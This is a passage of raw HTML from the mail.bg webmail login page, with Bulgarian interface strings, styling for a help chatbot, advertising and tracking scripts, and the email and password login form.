\u0417\u0430\u0440\u0435\u0434\u0435\u0442\u0435 \u0441\u0430\u0439\u0442\u0430 \u0441 \u0434\u0440\u0443\u0433 (\u0438\u043b\u0438 \u043f\u043e-\u043d\u043e\u0432\u0430 \u0432\u0435\u0440\u0441\u0438\u044f).","Email address":"\u0416\u0435\u043b\u0430\u043d email \u0430\u0434\u0440\u0435\u0441","SAVE":"\u0417\u0410\u041f\u0410\u0417\u0418","Phone":"\u0422\u0435\u043b\u0435\u0444\u043e\u043d","Contact email":"\u0418\u043c\u0435\u0439\u043b \u0437\u0430 \u0432\u0440\u044a\u0437\u043a\u0430","Compose":"\u041d\u043e\u0432\u043e \u043f\u0438\u0441\u043c\u043e","New message":"\u041d\u043e\u0432\u043e \u043f\u0438\u0441\u043c\u043e","new message":"\u043d\u043e\u0432\u043e \u043f\u0438\u0441\u043c\u043e","Edit":"\u0420\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u0430\u0439","edit":"\u0440\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u0430\u0439","No unread messages":"\u041d\u044f\u043c\u0430 \u043d\u0435\u0447\u0435\u0442\u0435\u043d\u0438 \u043f\u0438\u0441\u043c\u0430","1 unread message":"1 \u043d\u0435\u0447\u0435\u0442\u0435\u043d\u043e \u043f\u0438\u0441\u043c\u043e","2 unread messages":"2 \u043d\u0435\u0447\u0435\u0442\u0435\u043d\u0438 \u043f\u0438\u0441\u043c\u0430","%num% unread messages":"%num% \u043d\u0435\u0447\u0435\u0442\u0435\u043d\u0438 \u043f\u0438\u0441\u043c\u0430","Used":"\u0417\u0430\u0435\u0442\u0438","%used% of %size%":"%used% \u043e\u0442 %size%","From":"\u041e\u0442","Address":"\u0410\u0434\u0440\u0435\u0441","All":"\u0412\u0441\u0438\u0447\u043a\u0438","Delete":"\u0418\u0437\u0442\u0440\u0438\u0439","Inbox":"\u0412\u0445\u043e\u0434\u044f\u0449\u0438","Sent":"\u0418\u0437\u043f\u0440\u0430\u0442\u0435\u043d\u0438","Drafts":"\u0427\u0435\u0440\u043d\u043e\u0432\u0438","Spam":"\u0421\u043f\u0430\u043c","Trash":"\u041a\u043e\u0448\u0447\u0435","Unseen":"\u041d\u0435\u0447\u0435\u0442\u0435\u043d\u0438","Unseen1":"\u041d\u0435\u0447\u0435\u0442\u0435\u043d\u043e","Recipient":"\u041f\u043e\u043b\u0443\u0447\u0430\u0442\u0435\u043b","Cc":"\u041a\u043e\u043f\u0438\u0435","Subject":"\u041e\u0442\u043d\u043e\u0441\u043d\u043e","attached":"\u043f\u0440\u0438\u043a\u0430\u0447\u0435\u043d\u0438","of maximum 1000 MB":"\u043e\u0442 \u043c\u0430\u043a\u0441\u0438\u043c\u0443\u043c 1000 MB","This file cannot be attached because it's size is more than 1 GB":"\u0422\u043e\u0437\u0438 \u0444\u0430\u0439\u043b \u043d\u0435 \u043c\u043e\u0436\u0435 \u0434\u0430 \u0431\u044a\u0434\u0435 \u043f\u0440\u0438\u043a\u0430\u0447\u0435\u043d, \u0442\u044a\u0439 \u043a\u0430\u0442\u043e \u0440\u0430\u0437\u043c\u0435\u0440\u044a\u0442 \u043c\u0443 \u0435 \u043d\u0430\u0434 1 GB","Disable the rich text editor":"\u0418\u0437\u043a\u043b\u044e\u0447\u0438 \u0440\u0435\u0434\u0430\u043a\u0442\u043e\u0440\u0430","Enable the rich text editor":"\u0412\u043a\u043b\u044e\u0447\u0438 \u0440\u0435\u0434\u0430\u043a\u0442\u043e\u0440\u0430","[no name]":"[\u043d\u044f\u043c\u0430 \u0438\u043c\u0435]","to":"\u0434\u043e","To":"\u0414\u043e","More recipients":"\u0421\u043a\u0440\u0438\u0442\u0438 \u043f\u043e\u043b\u0443\u0447\u0430\u0442\u0435\u043b\u0438","Hide images":"\u0421\u043a\u0440\u0438\u0439 \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438\u0442\u0435","Show images":"\u041f\u043e\u043a\u0430\u0436\u0438 \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438\u0442\u0435","Print":"\u041f\u0440\u0438\u043d\u0442\u0438\u0440\u0430\u043d\u0435","Change picture":"\u041f\u0440\u043e\u043c\u0435\u043d\u0438 \u0441\u043d\u0438\u043c\u043a\u0430\u0442\u0430","Not in a group":"\u041d\u044f\u043c\u0430 \u0433\u0440\u0443\u043f\u0430","Company":"\u041e\u0440\u0433\u0430\u043d\u0438\u0437\u0430\u0446\u0438\u044f","Profession":"\u0414\u043b\u044a\u0436\u043d\u043e\u0441\u0442","Web page":"\u0423\u0435\u0431 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0430","Male":"\u041c\u044a\u0436","Female":"\u0416\u0435\u043d\u0430","January":"\u042f\u043d\u0443\u0430\u0440\u0438","February":"\u0424\u0435\u0432\u0440\u0443\u0430\u0440\u0438","March":"\u041c\u0430\u0440\u0442","April":"\u0410\u043f\u0440\u0438\u043b","May":"\u041c\u0430\u0439","June":"\u042e\u043d\u0438","July":"\u042e\u043b\u0438","August":"\u0410\u0432\u0433\u0443\u0441\u0442","September":"\u0421\u0435\u043f\u0442\u0435\u043c\u0432\u0440\u0438","October":"\u041e\u043a\u0442\u043e\u043c\u0432\u0440\u0438","November":"\u041d\u043e\u0435\u043c\u0432\u0440\u0438","December":"\u0414\u0435\u043a\u0435\u043c\u0432\u0440\u0438","january":"\u044f\u043d\u0443\u0430\u0440\u0438","february":"\u0444\u0435\u0432\u0440\u0443\u0430\u0440\u0438","march":"\u043c\u0430\u0440\u0442","april":"\u0430\u043f\u0440\u0438\u043b","may":"\u043c\u0430\u0439","june":"\u044e\u043d\u0438","july":"\u044e\u043b\u0438","august":"\u0430\u0432\u0433\u0443\u0441\u0442","september":"\u0441\u0435\u043f\u0442\u0435\u043c\u0432\u0440\u0438","october":"\u043e\u043a\u0442\u043e\u043c\u0432\u0440\u0438","november":"\u043d\u043e\u0435\u043c\u0432\u0440\u0438","december":"\u0434\u0435\u043a\u0435\u043c\u0432\u0440\u0438","messages":"\u043f\u0438\u0441\u043c\u0430","Period":"\u041f\u0435\u0440\u0438\u043e\u0434","Mobile phone":"\u041c\u043e\u0431\u0438\u043b\u0435\u043d","Work phone":"\u0421\u043b\u0443\u0436\u0435\u0431\u0435\u043d","Note":"\u0411\u0435\u043b\u0435\u0436\u043a\u0430","The address is taken. Please, choose another.":"\u0410\u0434\u0440\u0435\u0441\u044a\u0442 \u0435 \u0437\u0430\u0435\u0442. \u041c\u043e\u043b\u044f, \u0438\u0437\u0431\u0435\u0440\u0435\u0442\u0435 \u0434\u0440\u0443\u0433.","[no subject]":"[\u043d\u044f\u043c\u0430 \u043e\u0442\u043d\u043e\u0441\u043d\u043e]","Sender":"\u041f\u043e\u0434\u0430\u0442\u0435\u043b","Message sent successfully.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u0435 \u0438\u0437\u043f\u0440\u0430\u0442\u0435\u043d\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e.","Not saved in sent folder.":"\u041d\u0435\u0443\u0441\u043f\u0435\u0448\u0435\u043d \u0437\u0430\u043f\u0438\u0441 \u0432 \u0438\u0437\u043f\u0440\u0430\u0442\u0435\u043d\u0438.","Enter birth date":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u0440\u043e\u0436\u0434\u0435\u043d\u0430 \u0434\u0430\u0442\u0430","Error while checking":"\u0413\u0440\u0435\u0448\u043a\u0430 \u043f\u0440\u0438 \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430\u0442\u0430","Subject and recipient":"\u041e\u0442\u043d\u043e\u0441\u043d\u043e \u0438 \u043f\u043e\u043b\u0443\u0447\u0430\u0442\u0435\u043b","Subject and sender":"\u041e\u0442\u043d\u043e\u0441\u043d\u043e \u0438 \u043f\u043e\u0434\u0430\u0442\u0435\u043b","No labels":"\u041d\u044f\u043c\u0430 \u0435\u0442\u0438\u043a\u0435\u0442\u0438","Our Terms of Use have changed. You can read them <a href=\"\/terms\" target=\"_blank\">here<\/a>.":"\u0418\u043c\u0430 \u043f\u0440\u043e\u043c\u044f\u043d\u0430 \u0432 \u041e\u0431\u0449\u0438\u0442\u0435 \u0443\u0441\u043b\u043e\u0432\u0438\u044f \u0437\u0430 \u043f\u043e\u043b\u0437\u0432\u0430\u043d\u0435 \u043d\u0430 \u0441\u0430\u0439\u0442\u0430. \u041c\u043e\u0436\u0435\u0442\u0435 \u0434\u0430 \u0433\u0438 \u043f\u0440\u043e\u0447\u0435\u0442\u0435\u0442\u0435 <a href=\"\/terms\" target=\"_blank\">\u0442\u0443\u043a<\/a>.","Terms of Use change":"\u041f\u0440\u043e\u043c\u044f\u043d\u0430 \u0432 \u041e\u0431\u0449\u0438\u0442\u0435 \u0443\u0441\u043b\u043e\u0432\u0438\u044f","mailbox-last-updated":"\u041a\u0443\u0442\u0438\u044f\u0442\u0430 \u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u043e \u043e\u0431\u043d\u043e\u0432\u0435\u043d\u0430","mailbox-up-to-date":"\u041a\u0443\u0442\u0438\u044f\u0442\u0430 \u0435 \u0430\u043a\u0442\u0443\u0430\u043b\u043d\u0430.","Policies":"\u041f\u043e\u043b\u0438\u0442\u0438\u043a\u0438","alt-email-remove-failed":"\u041d\u0435\u0443\u0441\u043f\u0435\u0448\u043d\u043e \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u0430\u043b\u0442\u0435\u0440\u043d\u0430\u0442\u0438\u0432\u043d\u0438\u044f \u0438\u043c\u0435\u0439\u043b.","alt-email-removed":"\u0410\u043b\u0442\u0435\u0440\u043d\u0430\u0442\u0438\u0432\u043d\u0438\u044f\u0442 \u0438\u043c\u0435\u0439\u043b \u0435 \u043f\u0440\u0435\u043c\u0430\u0445\u043d\u0430\u0442.","recovery-phone-remove-failed":"\u041d\u0435\u0443\u0441\u043f\u0435\u0448\u043d\u043e \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430 \u0437\u0430 \u0432\u0440\u044a\u0437\u043a\u0430.","recovery-phone-removed":"\u0422\u0435\u043b\u0435\u0444\u043e\u043d\u044a\u0442 \u0437\u0430 \u0432\u0440\u044a\u0437\u043a\u0430 \u0435 \u043f\u0440\u0435\u043c\u0430\u0445\u043d\u0430\u0442.","recovery-email-remove-failed":"\u041d\u0435\u0443\u0441\u043f\u0435\u0448\u043d\u043e \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u0438\u043c\u0435\u0439\u043b\u0430.","recovery-email-removed":"\u0418\u043c\u0435\u0439\u043b\u044a\u0442 \u0435 \u043f\u0440\u0435\u043c\u0430\u0445\u043d\u0430\u0442.","forgotten-data-mismatch":"\u0412\u044a\u0432\u0435\u0434\u0435\u043d\u0438\u0442\u0435 \u0434\u0430\u043d\u043d\u0438 \u043d\u0435 \u0441\u044a\u0432\u043f\u0430\u0434\u0430\u0442.","forgotten-contact-email-invalid":"\u0412\u044a\u0432\u0435\u0434\u0435\u043d\u0438\u044f\u0442 \u0438\u043c\u0435\u0439\u043b \u0437\u0430 \u0432\u0440\u044a\u0437\u043a\u0430 \u0435 \u043d\u0435\u0432\u0430\u043b\u0438\u0434\u0435\u043d."};
</script>
<script type="text/javascript" src="https://mail.bg/js/script-6.js"></script>
<script type="text/javascript" src="https://stats.g.doubleclick.net/dc.js"></script>
<script src="https://mail.bg//adsy.mail.bg/js/b.js"></script>
<script src="https://mail.bg//adsy.mail.bg/js/prebid3.7.1.js" async=""></script>
<link href="https://mail.bg/css/videobranding.css" type="text/css" rel="stylesheet">
<link href="https://mail.bg/favicon.ico" rel="shortcut icon" type="image/x-icon">
<style>
@media all and (min-width: 1000px) {

html {
    /* BACKGROUND COLOR */
    background: white;
}

#login_top {
    /* LOGIN LEFT */
    left: -76px;
    /* LOGIN TOP */
    top: 1px;

    display: block;
    position: relative;
    z-index: 2;
}


body.branding {
    background: url('https://adsy.mail.bg/data/fm/1/2022-03-23/CoolFit_Home.jpg') no-repeat center top transparent;
}

#content {
    height: 800px;
    background: url('https://adsy.mail.bg/data/fm/1/2022-03-23/CoolFit_Home.jpg') no-repeat center top transparent;
}

.button {
  cursor: pointer;
}
.branding_body_link,
.branding_content_link {
    position: absolute;
    top: 0px;
    left: 0px;
    width: 100%;
    height: 800px;
    z-index: 1;
}

#branding_bottom_background {
    height: 404px;
    width: 100%;
    background-color: white;
    position: absolute;
    top: 800px;
}

#login_bottom {
    display: block;
    position: absolute;
    top: 800px;
    width: 100%;
}

#footer {
    display: block;
    top: 800px;
}

.branding .login_tabs {
    border-bottom: none;
}

}
@media all and (max-width: 979px) { #adsy-35 { display: none; } #adsy-overlay { display: none; } }
#helpbot {
    width: 420px;
    z-index: 999;
    position: fixed;
    bottom: 10px;
    right: 10px;
    height: 600px;
    display: none;
    box-shadow:0 10px 16px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
}
#helpbot h2 {
    font-size: 15px;
}
#helpbot .bot-close {
    background: url('/images/sprites_small-1.png') no-repeat transparent;
    background-position: -4px -612px;
    width: 13px;
    height: 13px;
    display: block;
    position: absolute;
    right: 17px;
    top: 10px;
    cursor: pointer;
}
#helpbot .message {
    position: relative;
    font-size: 14px;
    margin-bottom: 4px;
}
#helpbot .bot-message,
#helpbot .user-message {
    width: 350px;
}
#helpbot .user-message {
    text-align: right;
    margin-right: 0;
    margin-left: auto;
}
#helpbot .bot-name {
    margin-left: 52px;
    margin-bottom: 7px;
    color: #909090;
    font-size: 10px;
}
#helpbot .bot-avatar {
    display: inline-block;
    margin-right: 8px;
    width: 30px;
    height: 28px;
    background-image: url(/favicon.ico);
    margin-bottom: -6px;
}
#helpbot .bot-message .message-text {
    display: inline-block;
    border: grey;
    padding: 10px;
    border-radius: 15px 15px 15px 0px;
    margin-bottom: 5px;
    background-color: #ebebeb;
    max-width: 286px;
}
#helpbot .user-message .message-text {
    background-color: #c6d1ff;
    text-align: right;
    border: #c6d1ff;
    padding: 10px;
    border-radius: 15px 15px 0 15px;
    margin-bottom: 5px;
    display: inline-block;
}
#helpbot .timestamp {
    margin-left: 52px;
    color: #909090;
    font-size: 10px;
}
#helpbot .user-message + .timestamp {
    text-align: right;
}
/*
#helpbot .bot-option {
    border: 1px solid #c6d1ff;
}
*/
#helpbot input {
    float: none;
    width: 339px;
    padding-left: 6px;
    border: 2px solid #c6d1ff;
    border-radius: 15px 15px 0 15px;
    font-size: 12px;
}
#helpbot textarea {
    float: none;
    width: 332px;
    height: 47px;
    border: 2px solid #c6d1ff;
    border-radius: 15px 15px 0 15px;
    font-size: 12px;
    text-align: left;
    resize: none;
    padding: 5px 5px 5px 6px;
}
#helpbot .send-message {
    background: url('/images/sprites_small-1.png') no-repeat transparent;
    background-position: -29px -143px;
    width: 13px;
    height: 13px;
    display: inline-block;
    position: absolute;
    right: 9px;
    bottom: 9px;
}
#helpbot .option {
    display: block;
    border: 1px solid darkgray;
    background-color: #dbe8ff;
    margin-top: 8px;
    padding: 5px;
    border-radius: 15px;
    text-align: center;
}
#helpbot .option:nth-of-type(1) {
    margin-top: 0;
}
#helpbot .option:hover {
    color: #495bb1;
    background-color: #ebf6ff;
}
#helpbot-body {
    overflow-y: scroll;
    scrollbar-width: thin;
    width: 420px;
    padding-right: 7px;
    max-height: 562px;
    height: auto;
    position: absolute;
    bottom: 15px;
}
#helpbot-body::-webkit-scrollbar {
    width: 3px;
}
#helpbot-body::-webkit-scrollbar-track {
  background: #ddd;
}

#helpbot-body::-webkit-scrollbar-thumb {
  background: #666;
}
#helpbot-container {
    height: 562px;
}
#helpbot .feedback-stars {
    border: 2px solid #c6d1ff;
    border-radius: 15px 15px 0 15px;
    width: 121px;
    padding: 10px;
    display: inline-block;
}
#helpbot .star {
    background: url('/images/sprites_small-1.png') no-repeat transparent;
    background-position: -5px -1315px;
    width: 15px;
    height: 15px;
    display: inline-block;
    padding-left: 7px;
}
#helpbot .star.highlighted {
    background-position: -5px -1359px;
}

#helpbot .bot-loading {
    text-align: center;
}
#helpbot .bot-loading img {
    width: 30px;
}

@media all and (max-width: 600px) {
    #helpbot {
        width: 270px;
        max-height: 500px;
        height: auto;
        top: 10px;
        bottom: auto;
    }
    #helpbot-body {
        width: 268px;
        max-height: 461px;
        height: auto;
    }
    #helpbot .message {
        margin-top: 5px;
    }
    #helpbot .bot-message,
    #helpbot .user-message {
        width: 205px;
    }
    #helpbot .bot-message .message-text {
        max-width: 143px;
    }
    #helpbot textarea,
    #helpbot input {
        width: 180px;
    }
}
#bot-login {
    z-index: 1000;
    position: fixed;
    display: none;
    padding: 0;
    top: 39%;
    left: 41%;
}
#bot-login .input.login_input {
    width: 234px;
}

#bot-overlay {
    position: fixed;
    width: 100%;
    height: 100%;
    z-index: 1000;
    opacity: 0.8;
    background-color: black;
    display: none;
}

@media all and (max-height: 500px) {
    #helpbot {
        max-height: 250px;
    }
    #helpbot-body {
        max-height: 211px;
    }
}
    .banner_w300 {
        width: 300px;
    }
    @media all and (min-width: 980px) {
        #adsy-6 {
            display: block;
        }
        #adsy-128 {
            display: none;
        }
    }
    @media all and (max-width: 799px) {
        #adsy-6 {
            display: none;
        }
        #adsy-128 {
            display: block;
        }
    }
</style>
</head>

<body class="no_header branding">
<!-- BOT -->

<div id="helpbot" class="round_box">
    <div class="round_box_header_small">
        <h2>Чат асистент | Отдел поддръжка</h2>
        <span class="bot-close" onclick="Mail.Help.closeBot();"></span>
    </div>
    <div id="helpbot-container">
        <div id="helpbot-body"></div>
    </div>
</div>

<!-- OVERLAY -->
<div id="bot-overlay"></div>

<!-- BOT MESSAGE TEMPLATES -->
<div style="display: none;">
    <div id="bot-message-template" class="message">
        <div class="bot-name">Чат асистент</div>
        <div class="bot-message">
            <span class="bot-avatar"></span>
            <span class="message-text"></span>
        </div>
        <div class="timestamp"></div>
    </div>
    <div id="bot-text-input-template" class="message">
        <div class="user-message">
            <input type="text" autocomplete="new-password">
            <a class="send-message" href="javascript:;"></a>
        </div>
    </div>
    <div id="bot-textarea-template" class="message">
        <div class="user-message">
            <textarea></textarea>
            <a class="send-message" href="javascript:;"></a>
        </div>
    </div>
    <div id="user-message-template" class="message">
        <div class="user-message">
            <span class="message-text"></span>
        </div>
        <div class="timestamp"></div>
    </div>
    <div id="bot-multiple-choice-template" class="message">
        <div class="user-message">
            <a class="option" href="javascript:;"></a>
        </div>
    </div>
    <div id="bot-feedback-template" class="message">
        <div class="user-message">
            <span class="feedback-stars">
                <span class="star" onmouseenter="Mail.Help.highlight(this);" onmouseleave="Mail.Help.fade(this);"></span>
                <span class="star" onmouseenter="Mail.Help.highlight(this);" onmouseleave="Mail.Help.fade(this);"></span>
                <span class="star" onmouseenter="Mail.Help.highlight(this);" onmouseleave="Mail.Help.fade(this);"></span>
                <span class="star" onmouseenter="Mail.Help.highlight(this);" onmouseleave="Mail.Help.fade(this);"></span>
                <span class="star" onmouseenter="Mail.Help.highlight(this);" onmouseleave="Mail.Help.fade(this);"></span>
            </span>
        </div>
    </div>
    <div id="bot-loading-template" class="bot-loading">
        <img src="https://mail.bg/images/loading_40.gif">
    </div>
</div>

<div id="bot-login" class="popup">
    <div class="round_box login">
        <div class="round_box_header_small">
            <h3>Вход</h3>
        </div>
        <form id="ajax_login_form" onsubmit="return false;">
            <span class="login_label">Имейл:</span>
            <div class="input login_input pass" onselectstart="return false;">
                <input type="email" id="bot-login-email-input" class="input_box" onblur="if (Mail &amp;&amp; Mail.Help) Mail.Help.addDomain(this);" onselectstart="CancelBubble(event);">
            </div>
            <span class="login_label">Парола:</span>
            <div class="input login_input pass" onselectstart="return false;">
                <input type="password" id="bot-login-pass-input" class="input_box" onkeydown="if (Mail &amp;&amp; Mail.Help) Mail.Help.executeOnEnter(event, Mail.Help.loginFormSubmit);" onselectstart="CancelBubble(event);">
            </div>
            <div class="contacts_edit_footer">
                <a href="javascript:;" class="button small" onclick="Mail.Help.loginFormSubmit();">
                    ПРОДЪЛЖИ
                </a>
                <a href="javascript:;" class="contacts_edit_cancel" onclick="Mail.Help.closeLoginForm(this);">
                    Откажи
                </a>
            </div>
        </form>
            </div>
</div>
<a href="https://adsy.mail.bg/1x1.gif?visitor_id=1634121417-0-6154711257855116397&amp;ticket=1634121417-0-6154711257855116397&amp;event_id=3983369053&amp;channel=35&amp;creative=4450&amp;campaign=2079&amp;tag=&amp;name=click&amp;value=1&amp;next=https%3A%2F%2Fcoolfit.bg%2F&amp;js_ver=1.1" target="_blank" id="branding_body_link" class="branding_body_link"></a><div id="branding_bottom_background"></div><div id="content" class="content">
    <!-- home branding -->
<div id="adsy-35" class="adsy-channel" adsy_callback_target="6" adsy-displayed="visible"><!-- pixel -->
<div style="background: transparent;
            width: 2px;
            height: 2px;">&nbsp;</div>

<!-- main script -->
<script>
// DO NOT EDIT //
//
var href = 'https://adsy.mail.bg/1x1.gif?visitor_id=1634121417-0-6154711257855116397&ticket=1634121417-0-6154711257855116397&event_id=3983369053&channel=35&creative=4450&campaign=2079&tag=&name=click&value=1&next=https%3A%2F%2Fcoolfit.bg%2F&js_ver=1.1';
var css = 'no .css';

if ( ! style_sheet) {
    var style_sheet = document.createElement('link');
    style_sheet.href = 'https://mail.bg/css/videobranding.css';
    style_sheet.type = 'text/css';
    style_sheet.rel = 'stylesheet';
    document.getElementsByTagName('head')[0].appendChild(style_sheet);
    document.body.className += ' branding';

    var container = document.getElementById('content');
    if (container) {
        var link = document.createElement('a');
        link.href = href;
        link.target = '_blank';
        if ( ! document.getElementById('branding_body_link')) {
            var body_link = link.cloneNode(true);
            body_link.id = 'branding_body_link';
            body_link.className = 'branding_body_link';
            container.parentNode.insertBefore(body_link, container);
            var content_link = link.cloneNode(true);
            content_link.id = 'branding_content_link';
            content_link.className = 'branding_content_link';
            container.appendChild(content_link);
        }

        if ( ! document.getElementById('branding_bottom_background')) {
            var bottom_background = document.createElement('div');
            bottom_background.id = 'branding_bottom_background';
            container.parentNode.insertBefore(bottom_background, container);
        }
    }
}
//
// DO NOT EDIT //
</script>

<!-- css -->

<!-- additional tracking or code -->

<!-- double click tracking -->
<script>
// SET TRACKING SRC HERE
var adsy_dblckck_image_src = '';

// do not edit
if (adsy_dblckck_image_src) {
    var adsy_dblclck_image = document.createElement('img');
    adsy_dblclck_image.setAttribute('src', adsy_dblckck_image_src.replace('[timestamp]', Date.now()));
    adsy_dblclck_image.setAttribute('border', '0');
    adsy_dblclck_image.setAttribute('height', '1');
    adsy_dblclck_image.setAttribute('width', '1');
    document.body.appendChild(adsy_dblclck_image);
}
</script></div>
              <div id="adsy-58" class="adsy-channel" adsy-displayed="pending"></div><span id="element-over-video" style="display: none;"></span>

<!-- hide everything until loaded -->
<script>
if ( ! Mail) {
    Mail = {};
}
if ( ! Mail.Login) {
    Mail.Login = {};
}
Mail.Login.hideOverlay = function () {
    var overlay = document.getElementById('login-overlay');
    if ( ! overlay) {
        return;
    }
    overlay.style.display = 'none';
};
</script>
<div id="login-overlay" style="width: 100%; height: 100%; position: fixed; left: 0px; top: 0px; background-color: white; z-index: 999999999; display: none;"></div>
<script>
setTimeout(function () {
    Mail.Login.hideOverlay();
}, 1000);
</script>



<div id="header_message" class="header_message" style="display: none;">
    <div id="header_message_slider" class="header_message_slider">
        <div class="header_message_container">
            <span class="header_message_icon"></span>
            <span class="header_message_text"></span>
            <div class="header_message_toolbar">
                <a class="header_message_close" href="javascript:HideHeaderMessage();"></a>
            </div>
        </div>
    </div>
</div>
<div id="login_top">
    <div id="login_register">
                <img class="login_logo logo_bg" src="https://mail.bg/images/mail.bg_50gb_large.png" alt="Mail.bg 50 GB Logo">

                                <div class="login_register_title">
            <h1>
                Организирай своята комуникация            </h1>
            <h4>
                Най-функционалната поща в България            </h4>
        </div>
                <ul class="login_bullet_list">
            <li class="bullet">
                Достъп с mail клиент и мобилен телефон            </li>
            <li class="bullet">
                Защита от вируси и СПАМ            </li>
                        <li class="bullet">
                Поща на ваш домейн            </li>
                            </ul>
                        <a id="register" class="login_register_link" href="https://mail.bg/signup">
                    <span class="login_register_icon"></span>
            <div class="login_register_text_top">
                РЕГИСТРИРАЙ НОВ АДРЕС            </div>
            <div class="login_register_text_bottom">
                Безплатно! Отнема само минутка!            </div>
        </a>
            </div>
    <div id="login">
        <div class="round_box login">
            <div class="round_box_header_small">
                                <h3>Вход</h3>
                            </div>
                        <form id="loginform" method="post" action="" onsubmit="loginFormSubmit();
                            return false;" style="position: static; height: auto; overflow: visible; zoom: 1;">
                            <input id="url_hash" type="hidden" name="urlhash" value="">
                <input id="remember_me" type="hidden" name="rememberme" value="0">
                <input id="long_session" type="hidden" name="longsession" value="0">
                <input id="https_session" type="hidden" name="httpssession" value="0">
                <input id="jan_offset" type="hidden" name="jan_offset" value="0">
                <input id="jun_offset" type="hidden" name="jun_offset" value="0">
                <input id="i_cors" type="hidden" name="cors_capable" value="0">
                <span class="login_label">
                    Имейл адрес:
                </span>
                <div class="input login_input user" onselectstart="return false;">
                    <input id="imapuser" class="input_box" name="user" placeholder="@mail.bg" type="email" value="" onblur="if (typeof checkUserValue === 'function') {
                                       checkUserValue(this);
                                   }" onfocus="if (typeof HideHint === 'function') {
                                        HideHint('login_message');
                                    }" onselectstart="CancelBubble(event);">
                </div>
                <span class="login_label">
                    Парола:
                </span>
                <div class="input login_input pass" onselectstart="return false;">
                    <input id="pass" class="input_box" name="pass" type="password" onkeypress="checkKey(
                             this,
                             event,
                             'login_message',
                             'login_inputs'
                           )" onfocus="if (typeof HideHint == 'function') {
                                        HideHint('login_message');
                                    }" onselectstart="CancelBubble(event);">
                </div>

                <div class="login_checkbox" style="">
                    <a id="longses_checkbox" class="checkbox
                              " href="javascript:;">
                        Остави ме логнат                    </a>
                </div>

                <div class="login_button">
                    <button class="button small" type="submit">
                        ВЛЕЗ                    </button>
                    <a class="login_forgot_password" href="https://mail.bg/auth/forgotten">
                        Забравена парола »                    </a>
                </div>
                <input type="submit" class="transparent">
                                <span class="login_letter
                             letter_bg">
                </span>
                            </form>
            <div id="js_message" class="message_login" style="display: none;">
                <span class="message_icon big_error"></span>
                <h4 class="message_text mt_login">За да използвате този сайт трябва да включите JavaScript.</h4>
                В Chrome това става от меню Инструменти -&gt; Опции -&gt; Разширени Настройки -&gt; Настройки за съдържанието.            </div>
            <script>
            // restore login form
            document.getElementById('js_message').style.display = 'none';
            var login_form = document.getElementById('loginform');
            login_form.style.position = 'static';
            login_form.style.zoom = 1;
            login_form.style.height = 'auto';
            login_form.style.overflow = 'visible';

            // login form focus
            (function () {
                var imap_user_input = document.getElementById('imapuser');
                if (imap_user_input.value === '') {
                    imap_user_input.focus();
                    return;
                }
                document.getElementById('pass').focus();
            })();
            </script>
            <span class="login_footer">

                                <a class="signup-link" href="https://mail.bg/signup">
                                    Регистрация на нов имейл адрес »                </a>

                            </span>
            <div id="login_message" class="hint" style="display: none;">
                <div class="round_box">
                    <span class="hint_text"></span>
                    <span class="hint_arrow"></span>
                </div>
            </div>
            <div class="float_dummy"></div>
        </div>
    </div>
    <div id="login-banner" class="login_banner">
        <div id="login-banner-inner" class="banner banner_w300">
            <span class="banner_text_top">
                реклама            </span>
                            <div id="adsy-6" class="adsy-channel" dfp_code="
          <div id='dfp-r-tag'></div>
          <script>
            DFP.slotid++;
            var slotName = 'adslot' + DFP.slotid;
            var slotDiv = document.getElementById('dfp-r-tag');
            if (slotDiv) {
              slotDiv.id = slotName;
              if (googletag
                  &amp;&amp; typeof googletag.pubads === 'function'
              ) {
                googletag.pubads().setRequestNonPersonalizedAds(0);
                googletag.cmd.push(function () {
                  var slot = googletag.defineSlot(
                    '/' + 1036930 + '/' + '%DFP_UNIT%',
                    [300, 250],
                    slotName
                  ).addService(googletag.pubads());
                  googletag.display(slotName);
                  googletag.pubads().refresh([slot]);
                });
              }
            }
          </script>
        " dfp_units="[&quot;Mail.bg_DFP_Home_300x250&quot;, &quot;Mail.bg_DFP_Home_300x250&quot;]" adsy-displayed="pending"></div>
              <div id="adsy-128" class="adsy-channel" dfp_code="
          <div id='dfp-r-tag'></div>
          <script>
            DFP.slotid++;
            var slotName = 'adslot' + DFP.slotid;
            var slotDiv = document.getElementById('dfp-r-tag');
            if (slotDiv) {
              slotDiv.id = slotName;
              if (googletag
                  &amp;&amp; typeof googletag.pubads === 'function'
              ) {
                googletag.pubads().setRequestNonPersonalizedAds(0);
                googletag.cmd.push(function () {
                  var slot = googletag.defineSlot(
                    '/' + 1036930 + '/' + '%DFP_UNIT%',
                    [300, 600],
                    slotName
                  ).addService(googletag.pubads());
                  googletag.display(slotName);
                  googletag.pubads().refresh([slot]);
                });
              }
            }
          </script>
        " dfp_units="[&quot;Mail.bg_DFP_300x600&quot;]"></div>                    </div>
    </div>

</div>

<!-- LOGIN BOTTOM START -->
<div id="login_bottom">
    <ul class="login_tabs" style="margin-bottom: 15px;">
            </ul>
            <div id="login_features_content" class="login_features_container" style="display: block;">
        <div class="login_features">
            <div class="login_feature">
                <span class="login_fetures_image features_size"></span>
                <h5 class="login_fetures_title">
                    Размерът има значение                </h5>
                <ul class="login_fetures_list">
                    <li class="login_fetures_list_item">
                        50 GB пощенска кутия                        <div class="tag tag_right color1">
                            <span class="tag_name">
                                Ново                            </span>
                        </div>
                    </li>
                    <li class="login_fetures_list_item">
                        20 MB приложения (атачмънти)                    </li>
                    <li class="login_fetures_list_item">
                        1 GB файл до всяка поща по света                    </li>
                </ul>
                <div class="float_dummy"></div>
            </div>
            <div class="login_feature">
